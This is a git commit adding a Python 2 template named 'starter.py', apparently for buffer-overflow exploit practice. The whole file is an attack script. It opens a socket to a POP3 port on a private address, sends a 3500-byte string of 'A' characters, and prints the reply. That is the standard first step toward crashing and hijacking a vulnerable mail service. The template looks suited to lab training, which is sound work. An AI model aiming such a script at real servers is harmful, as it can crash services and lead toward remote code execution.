ccbfd84b97b1d4914a72ff3277d604baf3597d7e
Tym Rabchuk <tymrabchuk@gmail.com>
2019-07-02 19:37:17 -0400

    Update starter.py

--- BO/templates/starter.py
+++ BO/templates/starter.py
@@ -1,1 +1,30 @@
+#!/usr/bin/python
+import socket
+import struct
 
+#set up the IP and port to connect to
+RHOST = "192.168.1.238" 
+RPORT = 110
+
+#set up the IP and port to connect to
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((RHOST,RPORT))
+
+#build a message
+
+buf = ""
+buf += "A"*3500
+buf += "\n"
+
+#send the message
+s.send(buf)
+
+#print what we sent
+
+print "Sent: {0}".format(buf)
+
+#receive some data from socket
+data = s.recv(1024)
+
+#print out what received
+print "Received: {0}".format(data)
